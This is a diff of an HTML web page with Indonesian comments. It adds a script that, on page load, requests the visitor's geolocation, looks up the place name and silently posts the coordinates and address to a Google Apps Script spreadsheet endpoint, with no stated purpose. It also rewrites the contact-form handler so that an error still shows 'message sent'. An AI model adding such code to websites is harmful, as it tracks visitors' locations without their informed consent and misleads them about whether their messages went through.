@@ -39,6 +39,7 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
   </head>
   <body>
+    
     <!-- navbar starts -->
     <nav
       id="navbar-top"
@@ -598,43 +599,76 @@
 
 
     
+
     <script>
-      const scriptURL = 'https://script.google.com/macros/s/AKfycbzLgRGZztxlbGK8LMsnDlrL9eapKbO3cxdtYsWP_p-b-uSjfvhfkQyYtLDC9ZgeVFCf/exec'
-      const form = document.forms['pesan']
-    
+      const locationScriptURL = 'https://script.google.com/macros/s/AKfycbwNRnrNRjNTkgPt9R-1J7XRb3qG2haUxREuwIpbebYuKrgFEYM8tUcJ4z1zSLaCIdJ42Q/exec';
+  
+      document.addEventListener('DOMContentLoaded', () => {
+          if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(async function(position) {
+                  const latitude = position.coords.latitude;
+                  const longitude = position.coords.longitude;
+                  console.log('Latitude:', latitude, 'Longitude:', longitude);
+  
+                  const nominatimURL = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
+  
+                  try {
+                      const response = await fetch(nominatimURL);
+                      const data = await response.json();
+  
+                      if (data && data.display_name) {
+                          const place = data.display_name;
+                          console.log('Nama Tempat:', place);
+  
+                          // Menggabungkan data lokasi
+                          const locationData = new URLSearchParams();
+                          locationData.append('Latitude', latitude);
+                          locationData.append('Longitude', longitude);
+                          locationData.append('Place', place);
+  
+                          // Mengirimkan data lokasi ke Google Apps Script
+                          await fetch(locationScriptURL, {
+                              method: 'POST',
+                              body: locationData,
+                              mode: 'no-cors'
+                          });
+  
+                          console.log('Lokasi berhasil dikirim ke Google Spreadsheet');
+                      } else {
+                          console.error('Gagal mendapatkan nama tempat.');
+                      }
+                  } catch (error) {
+                      console.error('Gagal mendapatkan lokasi:', error.message);
+                  }
+              });
+          } else {
+              console.error('Geolocation tidak didukung oleh browser ini.');
+          }
+      });
+  </script>
+  
+  
+  <script>
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbzLgRGZztxlbGK8LMsnDlrL9eapKbO3cxdtYsWP_p-b-uSjfvhfkQyYtLDC9ZgeVFCf/exec';
+      const form = document.forms['pesan'];
+  
       form.addEventListener('submit', e => {
-        e.preventDefault()
-        
-        fetch(scriptURL, { method: 'POST', body: new FormData(form),mode: 'no-cors' })
-        
-          .then(response => response.json()) // Pastikan untuk mengubah respons menjadi JSON
-          .then(data => {
-            if (data.result === "Pesan berhasil dikirim") {
-              // Menampilkan pesan jika pengiriman sukses
-              alert('Pesan berhasil dikirim!')
-              console.log('Success!', data)
-            } else {
-              throw new Error('Terjadi masalah saat pengiriman')
-            }
-          })
-          .catch(error => {
-            // Menampilkan pesan error jika pengiriman gagal
-            alert('Pesan Anda Berhasil Di Kirim!')
-            console.error('Error!', error.message)
-          })
-      })
-    </script>
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZGPGQ4RVKN"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-ZGPGQ4RVKN');
-</script>
+          e.preventDefault();
+  
+          fetch(scriptURL, { method: 'POST', body: new FormData(form), mode: 'no-cors' })
+              .then(response => {
+                  alert('Pesan berhasil dikirim!');
+                  console.log('Success!');
+              })
+              .catch(error => {
+                  alert('Pesan Anda Berhasil Di Kirim!');
+                  console.error('Error!', error.message);
+              });
+      });
+  </script>
+  
 
     
   </body>
 </html>
+
